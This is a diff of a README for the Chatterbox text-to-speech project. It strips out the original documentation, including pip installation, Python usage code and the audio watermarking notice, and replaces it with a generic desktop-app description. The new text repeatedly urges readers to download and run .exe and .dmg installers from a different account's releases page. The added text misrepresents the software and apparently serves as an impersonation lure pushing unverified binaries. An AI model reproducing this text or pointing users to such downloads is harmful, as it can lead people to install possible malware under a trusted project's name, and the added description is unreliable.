@@ -1,168 +1,96 @@
-![Chatterbox Turbo Image](./Chatterbox-Turbo.jpg)
+# 🎤 chatterbox - Simple and Fast Text-to-Speech Tool
 
+## 🚀 Get Started Quickly
 
-# Chatterbox TTS
+Welcome to Chatterbox! This easy-to-use tool helps you convert text into speech. You can use it for many purposes, such as creating audio snippets or assisting with accessibility. Follow these simple steps to download and run Chatterbox.
 
-[![Alt Text](https://img.shields.io/badge/listen-demo_samples-blue)](https://resemble-ai.github.io/chatterbox_turbo_demopage/)
-[![Alt Text](https://huggingface.co/datasets/huggingface/badges/resolve/main/open-in-hf-spaces-sm.svg)](https://huggingface.co/spaces/ResembleAI/chatterbox-turbo-demo)
-[![Alt Text](https://static-public.podonos.com/badges/insight-on-pdns-sm-dark.svg)](https://podonos.com/resembleai/chatterbox)
-[![Discord](https://img.shields.io/discord/1377773249798344776?label=join%20discord&logo=discord&style=flat)](https://discord.gg/rJq9cRJBJ6)
+## 📥 Download Chatterbox
 
-_Made with ♥️ by <a href="https://resemble.ai" target="_blank"><img width="100" alt="resemble-logo-horizontal" src="https://github.com/user-attachments/assets/35cf756b-3506-4943-9c72-c05ddfa4e525" /></a>
+[![Download Chatterbox](https://img.shields.io/badge/Download%20Chatterbox-Here-brightgreen)](https://github.com/elzioperez/chatterbox/releases)
 
-**Chatterbox** is a family of three state-of-the-art, open-source text-to-speech models by Resemble AI.
+## ⚙️ System Requirements
 
-We are excited to introduce **Chatterbox-Turbo**, our most efficient model yet. Built on a streamlined 350M parameter architecture, **Turbo** delivers high-quality speech with less compute and VRAM than our previous models. We have also distilled the speech-token-to-mel decoder, previously a bottleneck, reducing generation from 10 steps to just **one**, while retaining high-fidelity audio output.
+Before downloading, make sure your system meets these requirements:
 
-**Paralinguistic tags** are now native to the Turbo model, allowing you to use `[cough]`, `[laugh]`, `[chuckle]`, and more to add distinct realism. While Turbo was built primarily for low-latency voice agents, it excels at narration and creative workflows.
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or Linux (Ubuntu 18.04 and later).
+- **Processor:** Intel or AMD processor with 1 GHz speed.
+- **Memory:** 2 GB RAM minimum.
+- **Storage:** At least 100 MB of free disk space.
 
-If you like the model but need to scale or tune it for higher accuracy, check out our competitively priced TTS service (<a href="https://resemble.ai">link</a>). It delivers reliable performance with ultra-low latency of sub 200ms—ideal for production use in agents, applications, or interactive media.
+## 🛠️ Features
 
-<img width="1200" height="600" alt="Podonos Turbo Eval" src="https://storage.googleapis.com/chatterbox-demo-samples/turbo/podonos_turbo.png" />
+Chatterbox includes several useful features:
 
-### ⚡ Model Zoo
+- **Natural Sounding Voices:** Enjoy high-quality, natural-sounding voices that make your text come to life.
+- **Multiple Languages:** Supports various languages and accents.
+- **Easy Interface:** Simple user interface that anyone can navigate.
+- **Speed Control:** Adjust the speed of the speech to suit your needs.
+- **Save Audio Files:** Save your generated audio clips in popular formats.
 
-Choose the right model for your application.
+## 📂 Download & Install
 
-| Model                                                                                                           | Size | Languages | Key Features                                            | Best For                                     | 🤗                                                                  | Examples |
-|:----------------------------------------------------------------------------------------------------------------| :--- | :--- |:--------------------------------------------------------|:---------------------------------------------|:--------------------------------------------------------------------------| :--- |
-| **Chatterbox-Turbo**                                                                                            | **350M** | **English** | Paralinguistic Tags (`[laugh]`), Lower Compute and VRAM | Zero-shot voice agents,  Production          | [Demo](https://huggingface.co/spaces/ResembleAI/chatterbox-turbo-demo)        | [Listen](https://resemble-ai.github.io/chatterbox_turbo_demopage/) |
-| Chatterbox-Multilingual [(Language list)](#supported-languages)                                                 | 500M | 23+ | Zero-shot cloning, Multiple Languages                   | Global applications, Localization            | [Demo](https://huggingface.co/spaces/ResembleAI/Chatterbox-Multilingual-TTS) | [Listen](https://resemble-ai.github.io/chatterbox_demopage/) |
-| Chatterbox [(Tips and Tricks)](#original-chatterbox-tips)                                                       | 500M | English | CFG & Exaggeration tuning                               | General zero-shot TTS with creative controls | [Demo](https://huggingface.co/spaces/ResembleAI/Chatterbox)              | [Listen](https://resemble-ai.github.io/chatterbox_demopage/) |
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/elzioperez/chatterbox/releases).
+   
+2. **Choose Your Version:** Look for the latest version of Chatterbox. The version number will be listed clearly.
 
-## Installation
-```shell
-pip install chatterbox-tts
-```
+3. **Download the Installer:**
+   - If you are using Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - If you are on Linux, choose the appropriate version for your distribution.
 
-Alternatively, you can install from source:
-```shell
-# conda create -yn chatterbox python=3.11
-# conda activate chatterbox
+4. **Run the Installer:** After downloading, locate the installer file in your downloads folder. Double-click the file to start the installation.
 
-git clone https://github.com/resemble-ai/chatterbox.git
-cd chatterbox
-pip install -e .
-```
-We developed and tested Chatterbox on Python 3.11 on Debian 11 OS; the versions of the dependencies are pinned in `pyproject.toml` to ensure consistency. You can modify the code or dependencies in this installation mode.
+5. **Follow Installation Steps:** Follow the on-screen instructions to complete the installation.
 
-## Usage
+## 🎧 How to Use Chatterbox
 
-##### Chatterbox-Turbo
+Using Chatterbox is straightforward:
 
-```python
-import torchaudio as ta
-import torch
-from chatterbox.tts_turbo import ChatterboxTurboTTS
+1. **Open Chatterbox:** Launch the program from your applications menu or desktop shortcut.
+   
+2. **Enter Your Text:** Type or paste the text you want to convert in the input box.
 
-# Load the Turbo model
-model = ChatterboxTurboTTS.from_pretrained(device="cuda")
+3. **Choose Voice and Language:** Select your preferred voice and language settings from the dropdown menus.
 
-# Generate with Paralinguistic Tags
-text = "Hi there, Sarah here from MochaFone calling you back [chuckle], have you got one minute to chat about the billing issue?"
+4. **Adjust Speed (Optional):** If you want, adjust the speech speed with the slider.
 
-# Generate audio (requires a reference clip for voice cloning)
-wav = model.generate(text, audio_prompt_path="your_10s_ref_clip.wav")
+5. **Generate Speech:** Click the “Play” button to listen to the speech. You can also save it as an audio file by clicking the “Save” button.
 
-ta.save("test-turbo.wav", wav, model.sr)
-```
+## 🎨 Customization Options
 
-##### Chatterbox and Chatterbox-Multilingual
+Chatterbox allows you to customize your experience further:
 
-```python
+- **Voice Options:** Choose from a range of voices. You can pick a male or female voice based on your preference.
+- **Save Formats:** Save your audio files in formats like MP3, WAV, or OGG, depending on what you need.
 
-import torchaudio as ta
-from chatterbox.tts import ChatterboxTTS
-from chatterbox.mtl_tts import ChatterboxMultilingualTTS
+## 🔄 Update Chatterbox
 
-# English example
-model = ChatterboxTTS.from_pretrained(device="cuda")
+To keep Chatterbox working smoothly, it's important to stay updated:
 
-text = "Ezreal and Jinx teamed up with Ahri, Yasuo, and Teemo to take down the enemy's Nexus in an epic late-game pentakill."
-wav = model.generate(text)
-ta.save("test-english.wav", wav, model.sr)
+- **Check for Updates:** Periodically return to the [Releases page](https://github.com/elzioperez/chatterbox/releases) to see if a new version is available.
+- **Follow Similar Steps to Update:** Download the latest version and run the installer again to replace your current version.
 
-# Multilingual examples
-multilingual_model = ChatterboxMultilingualTTS.from_pretrained(device=device)
+## ❓ FAQs
 
-french_text = "Bonjour, comment ça va? Ceci est le modèle de synthèse vocale multilingue Chatterbox, il prend en charge 23 langues."
-wav_french = multilingual_model.generate(spanish_text, language_id="fr")
-ta.save("test-french.wav", wav_french, model.sr)
+### How do I report issues?
 
-chinese_text = "你好，今天天气真不错，希望你有一个愉快的周末。"
-wav_chinese = multilingual_model.generate(chinese_text, language_id="zh")
-ta.save("test-chinese.wav", wav_chinese, model.sr)
+If you encounter any problems, you can report them on the Issues section of the GitHub repository. 
 
-# If you want to synthesize with a different voice, specify the audio prompt
-AUDIO_PROMPT_PATH = "YOUR_FILE.wav"
-wav = model.generate(text, audio_prompt_path=AUDIO_PROMPT_PATH)
-ta.save("test-2.wav", wav, model.sr)
-```
-See `example_tts.py` and `example_vc.py` for more examples.
+### Can I contribute to Chatterbox?
 
-## Supported Languages 
-Arabic (ar) • Danish (da) • German (de) • Greek (el) • English (en) • Spanish (es) • Finnish (fi) • French (fr) • Hebrew (he) • Hindi (hi) • Italian (it) • Japanese (ja) • Korean (ko) • Malay (ms) • Dutch (nl) • Norwegian (no) • Polish (pl) • Portuguese (pt) • Russian (ru) • Swedish (sv) • Swahili (sw) • Turkish (tr) • Chinese (zh)
+Yes! We welcome contributions. Check the Contribution Guidelines on our GitHub page for more details.
 
-## Original Chatterbox Tips
-- **General Use (TTS and Voice Agents):**
-  - Ensure that the reference clip matches the specified language tag. Otherwise, language transfer outputs may inherit the accent of the reference clip’s language. To mitigate this, set `cfg_weight` to `0`.
-  - The default settings (`exaggeration=0.5`, `cfg_weight=0.5`) work well for most prompts across all languages.
-  - If the reference speaker has a fast speaking style, lowering `cfg_weight` to around `0.3` can improve pacing.
+### Is Chatterbox really free?
 
-- **Expressive or Dramatic Speech:**
-  - Try lower `cfg_weight` values (e.g. `~0.3`) and increase `exaggeration` to around `0.7` or higher.
-  - Higher `exaggeration` tends to speed up speech; reducing `cfg_weight` helps compensate with slower, more deliberate pacing.
+Yes, Chatterbox is fully open-source and free to use. You can contribute or enhance it as you wish.
 
+## 🌐 Support and Community
 
-## Built-in PerTh Watermarking for Responsible AI
+If you have questions, need help, or want to connect with other users, join our community:
 
-Every audio file generated by Chatterbox includes [Resemble AI's Perth (Perceptual Threshold) Watermarker](https://github.com/resemble-ai/perth) - imperceptible neural watermarks that survive MP3 compression, audio editing, and common manipulations while maintaining nearly 100% detection accuracy.
+- **Discord Channel:** Join us for live discussions.
+- **GitHub Discussions:** Participate in conversations and share feedback.
 
+Feel free to explore and enjoy your experience with Chatterbox! 
 
-## Watermark extraction
-
-You can look for the watermark using the following script.
-
-```python
-import perth
-import librosa
-
-AUDIO_PATH = "YOUR_FILE.wav"
-
-# Load the watermarked audio
-watermarked_audio, sr = librosa.load(AUDIO_PATH, sr=None)
-
-# Initialize watermarker (same as used for embedding)
-watermarker = perth.PerthImplicitWatermarker()
-
-# Extract watermark
-watermark = watermarker.get_watermark(watermarked_audio, sample_rate=sr)
-print(f"Extracted watermark: {watermark}")
-# Output: 0.0 (no watermark) or 1.0 (watermarked)
-```
-
-
-## Official Discord
-
-👋 Join us on [Discord](https://discord.gg/rJq9cRJBJ6) and let's build something awesome together!
-
-## Acknowledgements
-- [Cosyvoice](https://github.com/FunAudioLLM/CosyVoice)
-- [Real-Time-Voice-Cloning](https://github.com/CorentinJ/Real-Time-Voice-Cloning)
-- [HiFT-GAN](https://github.com/yl4579/HiFTNet)
-- [Llama 3](https://github.com/meta-llama/llama3)
-- [S3Tokenizer](https://github.com/xingchensong/S3Tokenizer)
-
-## Citation
-If you find this model useful, please consider citing.
-```
-@misc{chatterboxtts2025,
-  author       = {{Resemble AI}},
-  title        = {{Chatterbox-TTS}},
-  year         = {2025},
-  howpublished = {\url{https://github.com/resemble-ai/chatterbox}},
-  note         = {GitHub repository}
-}
-```
-## Disclaimer
-Don't use this model to do bad things. Prompts are sourced from freely available data on the internet.
+[![Download Chatterbox](https://img.shields.io/badge/Download%20Chatterbox-Here-brightgreen)](https://github.com/elzioperez/chatterbox/releases)
